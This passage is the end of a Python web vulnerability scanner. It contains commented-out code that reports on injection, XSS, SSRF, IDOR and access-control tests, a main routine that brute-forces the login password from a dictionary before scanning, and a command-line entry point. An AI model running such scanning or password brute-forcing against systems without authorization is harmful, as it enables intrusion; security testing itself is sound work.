#             if links_browser_cache_weakness:
#                 print("\n[!!!---!!!] Browser Cache Weakness Vulnerability on links:\n", file=self.report_file)
#                 print(*links_browser_cache_weakness, sep="\n", file=self.report_file)
#                 print("[END] End of Browser Cache Weakness Vulnerability", file=self.report_file)
#             else:
#                 print("\nBrowser Cache Weakness Test Performed", file=self.report_file)
#                 print("[WARN] No Browser Cache Weakness found!", file=self.report_file)
#
#             if links_vulnerable_to_lfi:
#                 print("\n[!!!---!!!] Local File Inclusion Vulnerability on links:\n", file=self.report_file)
#                 print(*links_vulnerable_to_lfi, sep="\n", file=self.report_file)
#                 print("[END] End of Local File Inclusion", file=self.report_file)
#             else:
#                 print("\nLFI Test Performed", file=self.report_file)
#                 print("[WARN] No LFI found!", file=self.report_file)
#
#             if links_lfi_directory_transversal:
#                 print("\n[!!!---!!!] Local File Inclusion Directory Transversal on links:\n", file=self.report_file)
#                 print(*links_lfi_directory_transversal, sep="\n", file=self.report_file)
#                 print("[END] End of Local File Inclusion Directory Transversal", file=self.report_file)
#             else:
#                 print("\nLFI Directory Transversal Test Performed", file=self.report_file)
#                 print("[WARN] No LFI Directory Transversal vulnerability found!", file=self.report_file)
#
#             if links_cookie_directory_transversal:
#                 print("\n[!!!---!!!] Cookies Local File Inclusion Directory Transversal  on links:\n", file=self.report_file)
#                 print(*links_cookie_directory_transversal, sep="\n", file=self.report_file)
#                 print("[END] End of Cookie Local File Inclusion Directory Transversal", file=self.report_file)
#             else:
#                 print("\nCookie Directory Transversal Test Performed", file=self.report_file)
#                 print("[WARN] No Cookie Directory Transversal vulnerability found!", file=self.report_file)
#
#             if links_bypass_authorization:
#                 print("\n[!!!---!!!] Bypassing Authorization Vulnerability:\n", file=self.report_file)
#                 print("Horizontal Bypassing Authorization on links:\n", file=self.report_file)
#                 print(*links_bypass_authorization, sep="\n", file=self.report_file)
#             else:
#                 print("\nBypassing Authorization Test Performed", file=self.report_file)
#                 print("[WARN] No Bypassing Authorization vulnerability found!", file=self.report_file)
#
#             if links_special_header:
#                 print("[!!!---!!!] Special Request Header Handling on links:\n", file=self.report_file)
#                 print(*links_special_header, sep="\n", file=self.report_file)
#                 print("[END] End of Bypassing Authorization Vulnerability", file=self.report_file)
#             else:
#                 print("\nSpecial Request Header Handling Test Performed", file=self.report_file)
#                 print("[WARN] No Special Request Header Handling vulnerability found!", file=self.report_file)
#
#             if links_xee_vuln:
#                 print("\n[!!!---!!!] XEE Vulnerability found on links:\n", file=self.report_file)
#                 print(*links_xee_vuln, sep="\n", file=self.report_file)
#                 print("[END] End of XEE Vulnerable links", file=self.report_file)
#             else:
#                 print("\nXEE Test Performed", file=self.report_file)
#                 print("[WARN] No XEE found!", file=self.report_file)
#
#             if links_xss_link:
#                 print("\n[!!!---!!!] XSS Vulnerability found on links:\n", file=self.report_file)
#                 print(*links_xss_link, sep="\n", file=self.report_file)
#                 print("[END] End of XSS Vulnerable links", file=self.report_file)
#             else:
#                 print("\nXSS on Links Test Performed", file=self.report_file)
#                 print("[WARN] No XSS on Links found!", file=self.report_file)
#
#             if links_idor:
#                 print("\n[!!!---!!!] Insecure Direct Object References on links:\n", file=self.report_file)
#                 print(*links_idor, sep="\n", file=self.report_file)
#                 print("[END] End of IDOR Links", file=self.report_file)
#             else:
#                 print("\nInsecure Direct Object References Test Performed", file=self.report_file)
#                 print("[WARN] No Insecure Direct Object References found!", file=self.report_file)
#
#             if links_javascript_code:
#                 print("\n[!!!---!!!] Javascript Code Execution Injection on links:\n", file=self.report_file)
#                 print(*links_javascript_code, sep="\n", file=self.report_file)
#                 print("[END] End of Javascript Code Execution Injection", file=self.report_file)
#             else:
#                 print("\nJavascript Code Execution Injection Test Performed", file=self.report_file)
#                 print("[WARN] No Javascript Code Execution Injection found!", file=self.report_file)
#
#             if links_html_injection:
#                 print("\n[!!!---!!!] HTML Injection on links:\n", file=self.report_file)
#                 print(*links_html_injection, sep="\n", file=self.report_file)
#                 print("[END] End of HTML Injection", file=self.report_file)
#             else:
#                 print("\nHTML Injection Test Performed", file=self.report_file)
#                 print("[WARN] No HTML Injection found!", file=self.report_file)
#
#             if links_host_header_injection:
#                 print("\n[!!!---!!!] Host Header Injection on links:\n", file=self.report_file)
#                 print(*links_host_header_injection, sep="\n", file=self.report_file)
#                 print("[END] End of Host Header Injection", file=self.report_file)
#             else:
#                 print("\nHost Header Injection Test Performed", file=self.report_file)
#                 print("[WARN] No Host Header Injection found!", file=self.report_file)
#
#             if links_ssrf_injection:
#                 print("\n[!!!---!!!] Server-Side Request Forgery Injection on links:\n", file=self.report_file)
#                 print(*links_ssrf_injection, sep="\n", file=self.report_file)
#                 print("[END] End of Server-Side Request Forgery Injection", file=self.report_file)
#             else:
#                 print("\nServer-Side Request Forgery Injection Test Performed", file=self.report_file)
#                 print("[WARN] No Server-Side Request Forgery Injection found!", file=self.report_file)
#
#             # Form Dependent Vulnerabilities
#
#             print("\n\t\t[++]       Form Vulnerabilities       [++]\n", file=self.report_file)
#
#             if links_forms_dict_xss:
#                 print("\n[!!!---!!!] XSS Vulnerabilities found:\n", file=self.report_file)
#                 for link in links_forms_dict_xss:
#                     print("Link:", link, "\nForm:\n", links_forms_dict_xss[link], file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nXSS Test Performed", file=self.report_file)
#                 print("[WARN] No XSS found!", file=self.report_file)
#
#             if links_forms_dict_file_upload:
#                 print("\n[!!!---!!!] File Upload Vulnerabilities found:\n", file=self.report_file)
#                 for link in links_forms_dict_file_upload:
#                     print("Link:", link, "\nForm:\n", links_forms_dict_file_upload[link], file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nFile Upload Test Performed", file=self.report_file)
#                 print("[WARN] No File Upload vulnerability found!", file=self.report_file)
#
#             if links_forms_dict_code_exec:
#                 print("\n[!!!---!!!] Code Execution Vulnerabilities found:\n", file=self.report_file)
#                 for link in links_forms_dict_code_exec:
#                     print("Link:", link, "\nForm:\n", links_forms_dict_code_exec[link], file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nCode Execution Test Performed", file=self.report_file)
#                 print("[WARN] No Code Execution vulnerability found!", file=self.report_file)
#
#             if links_forms_dict_ssi_injection:
#                 print("\n[!!!---!!!] SSI Injection Vulnerability found:\n", file=self.report_file)
#                 for link in links_forms_dict_ssi_injection:
#                     print("Link:", link, "\nForm:\n", links_forms_dict_ssi_injection[link], file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nSSI Injection Test Performed", file=self.report_file)
#                 print("[WARN] No SSI Injection found!", file=self.report_file)
#
#             if links_forms_dict_sql_injection:
#                 print("\n[!!!---!!!] SQL Injection Vulnerabilities found:\n", file=self.report_file)
#                 for link in links_forms_dict_sql_injection:
#                     print("Link:", link, "\nForm:\n", links_forms_dict_sql_injection[link], file=self.report_file)
#                     print("[TIME]", file=self.report_file)
#                     print("Without SQL Payload: ", sql_injection_dict_normal[link], "s", file=self.report_file)
#                     print("With SQL Payload injected: ", sql_injection_dict_injected[link], "s", file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nSQL Injection Test Performed", file=self.report_file)
#                 print("[WARN] No SQL Injection found!", file=self.report_file)
#
#             if links_forms_dict_nosql_injection:
#                 print("\n[!!!---!!!] NOSQL Injection Vulnerabilities found:\n", file=self.report_file)
#                 for link in links_forms_dict_nosql_injection:
#                     print("Link:", link, "\nForm:\n", links_forms_dict_nosql_injection[link], file=self.report_file)
#                     print("[TIME]", file=self.report_file)
#                     print("Without SQL Payload: ", nosql_injection_dict_normal[link], "s", file=self.report_file)
#                     print("With SQL Payload injected: ", nosql_injection_dict_injected[link], "s", file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nNOSQL Injection Test Performed", file=self.report_file)
#                 print("[WARN] No NOSQL Injection found!", file=self.report_file)
#
#             if links_forms__dict_sensitive_info:
#                 print("\n[!!!---!!!] Sensitive Information might be transferred over unsecure form:\n", file=self.report_file)
#                 for link in links_forms__dict_sensitive_info:
#                     print("Link:", link, "\nForm:\n", links_forms__dict_sensitive_info[link], file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nSensitive Information over HTTP Test Performed", file=self.report_file)
#                 print("[WARN] No Sensitive Information over HTTP found!", file=self.report_file)
#
#             if links_forms_files_in_form:
#                 print("\n[!!!---!!!] Sensitive Information might be referenced in hidden form action:\n", file=self.report_file)
#                 for link in links_forms_files_in_form:
#                     print("Link:", link, "\nForm:\n", links_forms_files_in_form[link], file=self.report_file)
#                     print("------", file=self.report_file)
#             else:
#                 print("\nSensitive Information reference in form action Test Performed", file=self.report_file)
#                 print("[WARN] No Sensitive Information reference in form action found!", file=self.report_file)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when generation report. Error: ", e, file=self.error_file)
#             pass
#
#     def run_scanner(self):
#         try:
#             global final_list
#             try:
#                 my_gui.update_progress_bar(10)
#             except Exception:
#                 pass
#             self.gather_info()
#             self.test_broken_auth(test=(True if config_object['TEST']['test_broken_auth'].lower() == "true" else False))
#             self.test_security_misconfiguration(test=(True if config_object['TEST']['test_security_misconfiguration'].lower() == "true" else False))
#             self.test_sensitive_data_exposure(test=(True if config_object['TEST']['test_sensitive_data_exposure'].lower() == "true" else False))
#             visible_links, final_list = self.create_return_merge_links()
#             for count, link in enumerate(final_list):
#                 try:
#                     try:
#                         my_gui.update_progress_bar(90/len(final_list))
#                     except Exception:
#                         pass
#                     forms = self.extract_forms(link)
#
#                     # Info Gathering
#                     self.gather_info(link)
#
#                     # Form Specific Tests
#                     for form in forms:
#                         print("Found form on links: " + link, file=self.map_file)
#                         self.test_injections(link, form, test=(True if config_object['TEST']['test_injection'].lower() == "true" else False))
#                         self.test_sensitive_data_exposure(link, form, test=(True if config_object['TEST']['test_sensitive_data_exposure'].lower() == "true" else False))
#                         self.test_security_misconfiguration(link, form, test=(True if config_object['TEST']['test_security_misconfiguration'].lower() == "true" else False))
#
#                     # Test Suites
#                     self.test_injections(link, test=(True if config_object['TEST']['test_injection'].lower() == "true" else False))
#                     self.test_broken_auth(link, test=(True if config_object['TEST']['test_broken_auth'].lower() == "true" else False))
#                     self.test_sensitive_data_exposure(link, test=(True if config_object['TEST']['test_sensitive_data_exposure'].lower() == "true" else False))
#                     self.test_xml_external_entities(link, test=(True if config_object['TEST']['test_xml_external_entities'].lower() == "true" else False))
#                     self.test_broken_access_control(link, test=(True if config_object['TEST']['test_broken_access_control'].lower() == "true" else False))
#
#                 except Exception as e:
#                     print("\n[ERROR] Something went wrong when running scanner. Error: ", e, file=self.error_file)
#                     pass
#
#             self.print_report()
#             try:
#                 my_gui.done_label()
#             except Exception:
#                 pass
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when running scanner. Error: ", e, file=self.error_file)
#             pass
#
#
# def main(report_file, map_file, error_file):
#     try:
#         print("\t\t\t\t\t\t[@@@]\t\t\tREPORT\t\t\t[@@@]\n\n", file=report_file)
#         print("\n\t\t[LOGIN REPORT]", file=report_file)
#         print("\t\t[ERROR REPORT]", file=error_file)
#         try:
#             my_gui.update_list_gui("Connecting to web application..")
#         except Exception:
#             pass
#         ignored_list = [x.strip() for x in config_object["WEBURL"]["ignored"].split(',')]
#         try:
#             requests.get(config_object['WEBURL']['target'])
#         except Exception as e:
#             if 'did not properly respond after a period of time' in str(e):
#                 try:
#                     my_gui.update_list_gui("Cannot connect to application. Quitting..")
#                     my_gui.cant_connect()
#                     quit()
#                 except Exception:
#                     print("Cannot connect to application. Quitting..")
#                     quit()
#                     pass
#
#         if not config_object['WEBURL']['index']:
#             config_object['WEBURL']['index'] = config_object['WEBURL']['target']
#
#         try_brute_force = LoginTests(
#             config_object["CREDENTIAL"]["username"],
#             config_object["WEBURL"]["login"],
#             config_object["FILE"]["password_dict"],
#             config_object["CREDENTIAL"]["wrong_username"],
#             config_object["CREDENTIAL"]["known_password"],
#             config_object["CREDENTIAL"]["certain_wrong_passwd"],
#             config_object["WEBURL"]["logout"],
#             report_file,
#             error_file
#         )
#         found_password = try_brute_force.get_correct_password()
#
#         if found_password:
#             vuln_scanner = Scanner(
#                 config_object["WEBURL"]["target"],
#                 ignored_list,
#                 report_file,
#                 map_file,
#                 error_file
#             )
#             data_dict = {
#                 config_object["CREDENTIAL"]["username_field"]: config_object["CREDENTIAL"]["username"],
#                 config_object["CREDENTIAL"]["password_field"]: found_password,
#                 config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#             }
#             vuln_scanner.session.post(config_object["WEBURL"]["login"], data=data_dict)
#             vuln_scanner.run_scanner()
#         else:
#             report_file.write("OK! No Password Found From BruteForce Test!" + "\nProceeding With Manual Input Password\n")
#             print("[END LOGIN REPORT]", file=report_file)
#             vuln_scanner = Scanner(
#                 config_object["WEBURL"]["target"],
#                 ignored_list,
#                 report_file,
#                 map_file,
#                 error_file
#             )
#             data_dict = {
#                 config_object["CREDENTIAL"]["username_field"]: config_object["CREDENTIAL"]["username"],
#                 config_object["CREDENTIAL"]["password_field"]: config_object["CREDENTIAL"]["known_password"],
#                 config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#             }
#             vuln_scanner.session.post(config_object["WEBURL"]["login"], data=data_dict)
#             vuln_scanner.run_scanner()
#     except Exception as e:
#         err_file = open('fatal_error.txt', 'w')
#         print("\n[ERROR] Something went wrong in main function. Error: ", e, file=err_file)
#         err_file.close()
#         pass
#
#
# def start_program():
#     try:
#         global report_dir_path
#         # Create directory for report and files inside
#         if config_object['FILE']['path_for_report_directory'] is None:
#             output_path = os.getcwd()
#         else:
#             output_path = config_object['FILE']['path_for_report_directory']
#         report_dir_path = os.path.join(output_path, 'Reports')
#         try:
#             os.mkdir(report_dir_path)
#         except FileExistsError:
#             pass
#         # Clears files if exists
#         report_path = os.path.join(report_dir_path, "Report.txt")
#         open(report_path, 'w').close()
#         architecture_path = os.path.join(report_dir_path, 'Web Application Map.txt')
#         open(architecture_path, 'w').close()
#         error_path = os.path.join(report_dir_path, 'Error Log.txt')
#         open(error_path, 'w').close()
#
#         # Appends to emptied file
#         rep_file = open(report_path, 'a')
#         arch_file = open(architecture_path, 'a')
#         err_file = open(error_path, 'a')
#
#         # Runs program
#         main(rep_file, arch_file, err_file)
#
#         # Close files
#         rep_file.close()
#         arch_file.close()
#         err_file.close()
#     except Exception as e:
#         err_file = open('fatal_error.txt', 'w')
#         print("\n[ERROR] Something went wrong in start function. Error: ", e, file=err_file)
#         err_file.close()
#         pass
#
#
#
# start_program()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Scan Web Application for Vulnerabilities')
    parser.add_argument("url", type=str, help="Provide an URL to scan")  # Provide argument for URL, add argument to
    # URL from ScanConfigParameters class
    # Provide
    # ignored links file
    parser.add_argument("-i", "--ignored_links_path", help="Absolute Path to ignored links file", default=os.getcwd())
    # Get Credentials for login if needed
    parser.add_argument("-u", "--username", help="Username to login with")
    parser.add_argument("-p", "--password", help="Password to login with")
    parser.add_argument("-s", "--static_scan", help="Scan a single URL provided in the terminal", action="store_true", default=False)
    parser.add_argument("-c", "--comprehensive_scan", help="Scan the application against all vulnerability tests available", action="store_true", default=False)

    args = parser.parse_args()

    if args.username and args.password:
        if args.static_scan:
            if re.match('^http|https?://', args.url):
                Scanner = Scanner(args.url, args.ignored_links_path, args.username, args.password, static_scan=args.static_scan, comprehensive_scan=args.comprehensive_scan)
            else:
                Scanner = Scanner('http://' + args.url, args.ignored_links_path, args.username, args.password, static_scan=args.static_scan, comprehensive_scan=args.comprehensive_scan)
        else:
            if re.match('^http|https?://', args.url):
                Scanner = Scanner(args.url, args.ignored_links_path, args.username, args.password, comprehensive_scan=args.comprehensive_scan)
            else:
                Scanner = Scanner('http://' + args.url, args.ignored_links_path, args.username, args.password, comprehensive_scan=args.comprehensive_scan)
    elif not (args.username and args.password):
        if args.static_scan:
            if re.match('^http|https?://', args.url):
                Scanner = Scanner(args.url, args.ignored_links_path, static_scan=args.static_scan, comprehensive_scan=args.comprehensive_scan)
            else:
                Scanner = Scanner('http://' + args.url, args.ignored_links_path, static_scan=args.static_scan, comprehensive_scan=args.comprehensive_scan)
        else:
            if re.match('^http|https?://', args.url):
                Scanner = Scanner(args.url, args.ignored_links_path, comprehensive_scan=args.comprehensive_scan)
            else:
                Scanner = Scanner('http://' + args.url, args.ignored_links_path, comprehensive_scan=args.comprehensive_scan)

# TO DO:
# Do injection on options key from form as well. modify with try and except.

